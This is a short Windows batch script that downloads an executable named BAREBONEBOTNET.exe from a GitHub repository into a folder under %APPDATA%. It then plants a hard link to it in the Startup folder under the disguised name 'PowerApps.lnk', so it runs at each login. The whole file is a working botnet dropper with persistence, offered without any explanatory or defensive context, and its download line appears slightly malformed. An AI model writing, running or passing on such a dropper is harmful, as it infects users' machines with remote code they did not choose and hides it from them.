cd %APPDATA%
mkdir InstalledApps
cd InstalledApps
curl https://github.com/ADMIN590/BAREBONEREXECUTOR/raw/main/BAREBONEBOTNET.exe %% BAREBONEBOTNET.exe
cd %APPDATA%/microsoft/windows/Start Menu/Programs/Startup
mklink /H PowerApps.lnk "%APPDATA%\InstalledApps\BAREBONEBOTNET.exe"
